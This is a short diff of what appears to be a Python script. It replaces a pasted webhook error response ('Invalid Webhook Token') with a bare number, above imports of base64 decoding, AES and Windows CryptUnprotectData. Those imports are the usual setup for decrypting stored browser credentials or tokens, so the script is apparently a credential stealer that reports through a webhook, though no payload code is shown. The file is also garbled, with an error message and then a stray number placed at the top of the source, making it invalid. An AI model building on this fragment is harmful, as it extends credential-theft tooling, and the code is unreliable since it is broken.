@@ -1,7 +1,4 @@
-{
-  "message": "Invalid Webhook Token",
-  "code": 50027
-}
+50027
 from base64 import b64decode
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
